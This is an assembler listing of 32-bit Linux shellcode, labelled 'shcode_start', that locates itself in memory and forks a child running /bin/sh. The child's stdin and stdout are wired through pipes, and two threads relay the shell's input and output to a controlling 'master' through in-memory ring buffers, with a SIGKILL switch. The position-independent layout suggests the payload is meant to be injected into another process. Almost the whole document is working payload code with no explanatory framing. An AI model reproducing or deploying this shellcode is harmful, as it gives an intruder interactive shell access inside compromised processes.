     1                                  BITS 32
     2                                  
     3                                  ;		     #   1   2   3   4   5   6
     4                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
     5                                  ; syscall return: EAX
     6                                  
     7                                  ;
     8                                  ; http://www.lxhp.in-berlin.de/lhpsyscal.html
     9                                  ;
    10                                  ; all necessary system calls:
    11                                  ; ===========================
    12                                  ;
    13                                  ; clone:	eax: 120
    14                                  ; 		ebx: clone-flags
    15                                  ; 		ecx: ptr to top of (distinct) stack space
    16                                  ; 		edx: ptr to pt_regs or NULL
    17                                  ;
    18                                  ; close:	eax: 6
    19                                  ; 		ebx: fd to close
    20                                  ;
    21                                  ; dup2:	eax: 63
    22                                  ; 		ebx: fd 2 dup
    23                                  ; 		ecx: fd to assign the dup to
    24                                  ;
    25                                  ; execve:	eax: 11
    26                                  ; 		ebx: ptr to string of program path&name
    27                                  ; 		ecx: ptr to argv[]
    28                                  ; 		edx: ptr to envv[]
    29                                  ;
    30                                  ; exit:	eax: 1
    31                                  ; 		ebx: exit code
    32                                  ;
    33                                  ; fcntl:	eax: 55
    34                                  ; 		ebx: fd
    35                                  ; 		ecx: command code
    36                                  ; 		edx: file locks: ptr to writable struct flock
    37                                  ;
    38                                  ; fork:	eax: 2
    39                                  ; 		ebx... are passed to forked process.
    40                                  ;
    41                                  ; kill:	eax: 37
    42                                  ; 		ebx: pid (?)
    43                                  ; 		ecx: signal (?)
    44                                  ; 		SIGKILL = 9
    45                                  ;
    46                                  ; nanosleep:	eax: 162
    47                                  ; 		ebx: ptr to struct timespec
    48                                  ; 		ecx: ptr to alterable struct timespec
    49                                  ;
    50                                  ; read:	eax: 3
    51                                  ; 		ebx: fd
    52                                  ; 		ecx: ptr to buffer
    53                                  ; 		edx: count
    54                                  ;
    55                                  ; write:	eax: 4
    56                                  ; 		ebx: fd
    57                                  ; 		ecx: ptr to buffer
    58                                  ; 		edx: count
    59                                  ;
    60                                  ; pipe:	eax: 42
    61                                  ; 		ebx: ptr to dword[2]
    62                                  ;
    63                                  
    64                                  start:
    65 00000000 E800000000              	call near shcode_start
    66                                  shcode_start:
    67 00000005 5D                      	pop	ebp
    68 00000006 81C522020000            	add	ebp, data_start - shcode_start
    69                                  
    70                                  	; pipe(m2sh)
    71 0000000C 31C0                    	xor	eax,eax
    72 0000000E B02A                    	mov	al,42
    73 00000010 89EB                    	mov	ebx,ebp
    74 00000012 81C315000000            	add	ebx,m2sh_0
    75 00000018 CD80                    	int	0x80
    76                                  
    77 0000001A 3D00000000              	cmp	eax,0
    78 0000001F 7524                    	jne	child_dead_interleaved
    79                                  
    80                                  	; pipe(sh2m)
    81 00000021 31C0                    	xor	eax,eax
    82 00000023 B02A                    	mov	al,42
    83 00000025 89EB                    	mov	ebx,ebp
    84 00000027 81C31D000000            	add	ebx,sh2m_0
    85 0000002D CD80                    	int	0x80
    86                                  
    87 0000002F 3D00000000              	cmp	eax,0
    88 00000034 750F                    	jne	child_dead_interleaved
    89                                  
    90                                  	; fork()
    91 00000036 31C0                    	xor	eax,eax
    92 00000038 B002                    	mov	al,2
    93 0000003A CD80                    	int	0x80
    94                                  
    95 0000003C 3D00000000              	cmp	eax,0
    96 00000041 7407                    	je	child
    97 00000043 7F5B                    	jg	parent			; signed compare
    98                                  child_dead_interleaved:
    99 00000045 E9A5010000              	jmp	child_dead
   100                                  
   101                                  child:
   102                                  	; dup2(m2sh[0], 0)   (dup to stdin)
   103 0000004A 31C0                    	xor	eax,eax
   104 0000004C B03F                    	mov	al,63
   105 0000004E 8B9D15000000            	mov	ebx,[ebp+m2sh_0]
   106 00000054 31C9                    	xor	ecx,ecx
   107 00000056 CD80                    	int	0x80
   108                                  
   109 00000058 39C8                    	cmp	eax,ecx
   110 0000005A 753F                    	jne	leave_sh_interleaved
   111                                  
   112                                  	; dup2(sh2m[1], 1)   (dup to stdout)
   113 0000005C 31C0                    	xor	eax,eax
   114 0000005E B03F                    	mov	al,63
   115 00000060 8B9D21000000            	mov	ebx,[ebp+sh2m_1]
   116 00000066 41                      	inc	ecx
   117 00000067 CD80                    	int	0x80
   118                                  
   119 00000069 39C8                    	cmp	eax,ecx
   120 0000006B 752E                    	jne	leave_sh_interleaved
   121                                  
   122                                  	; dup2(sh2m[1], 2)   (dup to stderr)
   123 0000006D 31C0                    	xor	eax,eax
   124 0000006F B03F                    	mov	al,63
   125                                  ;	mov	ebx,[ebp+sh2m_1]
   126 00000071 41                      	inc	ecx
   127 00000072 CD80                    	int	0x80
   128                                  
   129 00000074 39C8                    	cmp	eax,ecx
   130 00000076 7523                    	jne	leave_sh_interleaved
   131                                  
   132                                  	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
   133 00000078 31C0                    	xor	eax,eax
   134 0000007A B00B                    	mov	al,11
   135 0000007C 89EB                    	mov	ebx,ebp
   136 0000007E 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
   137                                  
   138 00000084 89E9                    	mov	ecx,ebp
   139 00000086 81C125020000            	add	ecx,foo				; ecx -> foo
   140                                  
   141 0000008C 31D2                    	xor	edx,edx
   142 0000008E 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
   143 00000090 895104                  	mov	[ecx+4],edx			; bar := NULL
   144 00000093 89CA                    	mov	edx,ecx
   145 00000095 42                      	inc	edx
   146 00000096 42                      	inc	edx
   147 00000097 42                      	inc	edx
   148 00000098 42                      	inc	edx				; edx -> bar
   149 00000099 CD80                    	int	0x80
   150                                  
   151                                  	; fail if execve did not work.
   152                                  leave_sh_interleaved:
   153 0000009B E980010000              	jmp	leave_sh
   154                                  
   155                                  parent:
   156                                  	; remember child's PID
   157 000000A0 898511000000            	mov	[ebp+child_pid],eax
   158                                  
   159                                  	; close(m2sh[0])
   160 000000A6 31C0                    	xor	eax,eax
   161 000000A8 B006                    	mov	al,6
   162 000000AA 8B9D15000000            	mov	ebx,[ebp+m2sh_0]
   163 000000B0 CD80                    	int	0x80
   164                                  
   165                                  	; close(sh2m[1])
   166 000000B2 31C0                    	xor	eax,eax
   167 000000B4 B006                    	mov	al,6
   168 000000B6 8B9D21000000            	mov	ebx,[ebp+sh2m_1]
   169 000000BC CD80                    	int	0x80
   170                                  
   171                                  	; clone:
   172                                  	; one thread for reader, one thread for writer
   173 000000BE 31C0                    	xor	eax,eax
   174 000000C0 B078                    	mov	al,120
   175                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
   176                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
   177                                  	; CLONE_PTRACE = 0x00002000
   178 000000C2 BB000F0100              	mov	ebx,0x00010f00
   179 000000C7 89E1                    	mov	ecx,esp	; just use same stack with a delta of 64
   180 000000C9 81EC40000000            	sub	esp,64 ; we need the stack only a tiny bit.
   181 000000CF 31D2                    	xor	edx,edx
   182 000000D1 CD80                    	int	0x80
   183                                  
   184 000000D3 3D00000000              	cmp	eax,0
   185                                  	; ret=0 -> clone
   186 000000D8 7407                    	je	thread_write_to_master_interleaved	; clone is writer
   187                                  	; ret>0 -> original
   188 000000DA 7F0A                    	jg	thread_read_from_master			; original is reader
   189                                  	; error if ret<0
   190 000000DC E90E010000              	jmp	child_dead
   191                                  
   192                                  thread_write_to_master_interleaved:
   193 000000E1 E98C000000              	jmp	thread_write_to_master
   194                                  
   195                                  	; ==================================== the READER thread:
   196                                  thread_read_from_master:
   197                                  	; will write to child via m2sh[1]
   198                                  	; remember RINGBUFFER from_master in esi
   199 000000E6 89EE                    	mov	esi,ebp
   200 000000E8 81C625000000            	add	esi,rfrm_buffer
   201                                  
   202                                  reader_while_fds_ok:
   203                                  	; while both FDs are ok:
   204 000000EE 8A8503000000            	mov	al,[ebp+to_child_ok]
   205 000000F4 028504000000            	add	al,[ebp+from_child_ok]
   206 000000FA 3C02                    	cmp	al,2
   207 000000FC 754D                    	jne	leave_sh_second_interleaved
   208                                  
   209                                  	; test, if master requested child to be terminated
   210 000000FE 8A8502000000            	mov	al,[ebp+terminate_child]
   211 00000104 3C00                    	cmp	al,0
   212 00000106 754F                    	jne	do_terminate_child
   213                                  
   214                                  	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
   215 00000108 31C0                    	xor	eax,eax
   216 0000010A 8A8505000000            	mov	al,[ebp+rfrm_writer_pos]
   217 00000110 2A8506000000            	sub	al,[ebp+rfrm_reader_pos]
   218 00000116 3C00                    	cmp	al,0
   219 00000118 7436                    	je	reader_sleep
   220                                  
   221                                  	; EAX/AL is the number of bytes to be written to the child.
   222                                  
   223                                  	; write a single byte to the child.
   224 0000011A 31C0                    	xor	eax,eax
   225 0000011C B004                    	mov	al,4
   226 0000011E 8B9D19000000            	mov	ebx,[ebp+m2sh_1]	; EBX := m2sh[1]
   227 00000124 31C9                    	xor	ecx,ecx
   228 00000126 8A8D06000000            	mov	cl,[ebp+rfrm_reader_pos]
   229 0000012C 01F1                    	add	ecx,esi			; ECX := reader_pos + buffer_base
   230 0000012E 31D2                    	xor	edx,edx
   231 00000130 42                      	inc	edx			; EDX := 1
   232 00000131 CD80                    	int	0x80
   233                                  
   234 00000133 31DB                    	xor	ebx,ebx
   235 00000135 43                      	inc	ebx
   236 00000136 39D8                    	cmp	eax,ebx
   237 00000138 7409                    	je	reader_write_to_child_ok
   238                                  
   239 0000013A C6850300000000          	mov byte [ebp+to_child_ok], 0
   240 00000141 EBAB                    	jmp	reader_while_fds_ok
   241                                  
   242                                  reader_write_to_child_ok:
   243                                  	; mark byte as read:
   244 00000143 FE8506000000            	inc byte [ebp+rfrm_reader_pos]
   245 00000149 EBA3                    	jmp	reader_while_fds_ok
   246                                  
   247                                  leave_sh_second_interleaved:
   248 0000014B E9D0000000              	jmp	leave_sh
   249                                  
   250                                  reader_sleep:
   251 00000150 E87D000000              	call	sleep_short
   252 00000155 EB97                    	jmp	reader_while_fds_ok
   253                                  
   254                                  do_terminate_child:
   255                                  	; reset flag
   256 00000157 31C0                    	xor	eax,eax
   257 00000159 888502000000            	mov	[ebp+terminate_child],al
   258                                  	; send a SIGKILL to child
   259 0000015F B025                    	mov	al,37
   260 00000161 8B9D11000000            	mov	ebx,[ebp+child_pid]
   261 00000167 31C9                    	xor	ecx,ecx
   262 00000169 B109                    	mov	cl,9	; SIGKILL
   263 0000016B CD80                    	int	0x80
   264                                  
   265                                  ;	; clear to_child_ok
   266                                  ;	xor	eax,eax
   267                                  ;	mov	[ebp+to_child_ok], eax
   268                                  ;	; and from_child_ok
   269                                  ;	mov	[ebp+from_child_ok], eax
   270                                  ;	jmp	leave_sh
   271                                  
   272                                  	; don't terminate, wait for child to close pipes. maybe it just relays the signal to other child.
   273 0000016D E97CFFFFFF              	jmp	reader_while_fds_ok
   274                                  
   275                                  	; ==================================== the WRITER thread:
   276                                  thread_write_to_master:
   277                                  	; will read from child via sh2m[0]
   278                                  	; remember RINGBUFFER to_master in esi
   279 00000172 89EE                    	mov	esi,ebp
   280 00000174 81C625010000            	add	esi,rto_buffer
   281                                  
   282                                  writer_while_fds_ok:
   283                                  	; while both FDs are ok:
   284 0000017A 8A8503000000            	mov	al,[ebp+to_child_ok]
   285 00000180 028504000000            	add	al,[ebp+from_child_ok]
   286 00000186 3C02                    	cmp	al,2
   287 00000188 7565                    	jne	child_dead
   288                                  
   289                                  	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
   290 0000018A 8A8507000000            	mov	al,[ebp+rto_writer_pos]
   291 00000190 FEC0                    	inc	al
   292 00000192 2A8508000000            	sub	al,[ebp+rto_reader_pos]
   293 00000198 7431                    	jz	writer_sleep
   294                                  
   295                                  	; read ONE SINGLE BYTE and pass it into the buffer.
   296 0000019A 31C0                    	xor	eax,eax
   297 0000019C B003                    	mov	al,3
   298 0000019E 8B9D1D000000            	mov	ebx,[ebp+sh2m_0]
   299 000001A4 31C9                    	xor	ecx,ecx
   300 000001A6 8A8D07000000            	mov	cl,[ebp+rto_writer_pos]
   301 000001AC 01F1                    	add	ecx,esi
   302 000001AE 31D2                    	xor	edx,edx
   303 000001B0 42                      	inc	edx
   304 000001B1 CD80                    	int	0x80
   305                                  
   306 000001B3 31DB                    	xor	ebx,ebx
   307 000001B5 43                      	inc	ebx
   308 000001B6 39D8                    	cmp	eax,ebx
   309 000001B8 7409                    	je	writer_read_from_child_ok
   310                                  
   311 000001BA C6850400000000          	mov byte [ebp+from_child_ok],0
   312 000001C1 EBB7                    	jmp	writer_while_fds_ok
   313                                  
   314                                  writer_read_from_child_ok:
   315 000001C3 FE8507000000            	inc byte [ebp+rto_writer_pos]
   316                                  
   317                                  	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
   318                                  	; read() will block if there is no data from child.
   319 000001C9 EBAF                    	jmp	writer_while_fds_ok
   320                                  
   321                                  writer_sleep:
   322 000001CB E802000000              	call	sleep_short
   323 000001D0 EBA8                    	jmp	writer_while_fds_ok
   324                                  
   325                                  	; ==================================================================
   326                                  
   327                                  sleep_short:
   328                                  	; sleep 0.001 seconds:
   329                                  	; usleep(0,1000000);
   330 000001D2 31C0                    	xor	eax,eax
   331 000001D4 B0A2                    	mov	al, 162
   332 000001D6 89EB                    	mov	ebx, ebp
   333 000001D8 81C325020000            	add	ebx, foo
   334 000001DE 89D9                    	mov	ecx, ebx
   335 000001E0 31D2                    	xor	edx,edx
   336 000001E2 8913                    	mov long [ebx], edx		; seconds
   337 000001E4 BAA0860100              	mov	edx,100000
   338 000001E9 895304                  	mov long [ebx+4], edx		; nanoseconds
   339 000001EC CD80                    	int	0x80
   340                                  
   341 000001EE C3                      	ret
   342                                  
   343                                  child_dead:
   344                                  	; at most wait 2 seconds for master's ACK
   345 000001EF 31C0                    	xor	eax,eax
   346 000001F1 388501000000            	cmp	[ebp+child_is_dead_ACK], al
   347 000001F7 7527                    	jne	leave_sh
   348 000001F9 B002                    	mov	al,2
   349 000001FB 388500000000            	cmp	[ebp+child_is_dead], al
   350 00000201 771D                    	ja	leave_sh
   351                                  
   352 00000203 FE4500                  	inc byte [ebp]
   353                                  
   354                                  	; usleep(1,0):
   355 00000206 31C0                    	xor	eax,eax
   356 00000208 B0A2                    	mov	al, 162
   357 0000020A 89EB                    	mov	ebx, ebp
   358 0000020C 81C325020000            	add	ebx, foo
   359 00000212 89D9                    	mov	ecx, ebx
   360 00000214 31D2                    	xor	edx,edx
   361 00000216 895304                  	mov long [ebx+4], edx		; nanoseconds
   362 00000219 42                      	inc	edx
   363 0000021A 8913                    	mov long [ebx], edx		; seconds
   364 0000021C CD80                    	int	0x80
   365                                  
   366 0000021E EBCF                    	jmp	child_dead
   367                                  
   368                                  leave_sh:
   369                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
   370 00000220 31C0                    	xor	eax,eax
   371 00000222 89C3                    	mov	ebx,eax
   372 00000224 40                      	inc	eax
   373 00000225 CD80                    	int	0x80
   374                                  
   375                                  ; =============================================================================
   376                                  ; DATA
   377                                  data_start EQU $
   378                                  
   379                                  ; do not change order of the following stuff!
   380                                  
   381                                  child_is_dead EQU $ - data_start
   382 00000227 00                      	db		0
   383                                  child_is_dead_ACK EQU $ - data_start
   384 00000228 00                      	db		0
   385                                  
   386                                  terminate_child	EQU $ - data_start
   387 00000229 00                      	db		0
   388                                  
   389                                  to_child_ok EQU $ - data_start
   390 0000022A 01                      	db		1
   391                                  from_child_ok EQU $ - data_start
   392 0000022B 01                      	db		1
   393                                  
   394                                  ; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
   395                                  ; a ringbuffer is FULL, if _reader == _writer+1
   396                                  
   397                                  ; ringbuffer from_master:
   398                                  
   399                                  rfrm_writer_pos EQU $ - data_start
   400 0000022C 00                      	db		0
   401                                  rfrm_reader_pos EQU $ - data_start
   402 0000022D 00                      	db		0
   403                                  
   404                                  ; ringbuffer to_master:
   405                                  
   406                                  rto_writer_pos EQU $ - data_start
   407 0000022E 00                      	db		0
   408                                  rto_reader_pos EQU $ - data_start
   409 0000022F 00                      	db		0
   410                                  
   411                                  execve_command EQU $ - data_start
   412 00000230 2F62696E2F736800        	db	'/bin/sh',0
   413                                  
   414                                  ; =============================================================================
   415                                  ; stuff that is not required to be initialized:
   416                                  align 4
   417                                  
   418                                  child_pid EQU $ - data_start
   419                                  
   420                                  ; pipes middleman<->shell
   421                                  m2sh_0 EQU $ - data_start + 4			; shell reads
   422                                  m2sh_1 EQU $ - data_start + 8			; master writes
   423                                  sh2m_0 EQU $ - data_start + 12			; master reads
   424                                  sh2m_1 EQU $ - data_start + 16			; shell writes
   425                                  
   426                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
   427                                  rto_buffer EQU $ - data_start + 276		; TO master
   428                                  
   429                                  foo EQU $ - data_start + 532
   430                                  bar EQU $ - data_start + 536
   431                                  
